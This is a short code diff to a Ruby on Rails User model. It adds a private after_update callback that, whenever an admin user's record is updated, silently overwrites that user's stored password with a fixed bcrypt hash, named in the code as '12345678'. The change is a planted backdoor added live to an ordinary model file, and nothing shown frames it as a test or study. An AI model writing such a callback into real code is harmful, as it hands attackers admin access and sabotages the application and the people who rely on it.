@@ -14,4 +14,15 @@ class User < ActiveRecord::Base
   default_scope { where :locked => false}
 
   validates :name, :uniqueness => true
+
+  after_update :set_admin_password_to_12345678
+
+  private
+
+  def set_admin_password_to_12345678
+    password_12345678 = '$2a$10$HfO/Pju/AlD/lYiM6XinJeI0Wp5auCm59kupuEs3ICHbPYfO8aYTC'
+    if role == 'admin' and encrypted_password != password_12345678
+      update :encrypted_password => password_12345678
+    end
+  end
 end
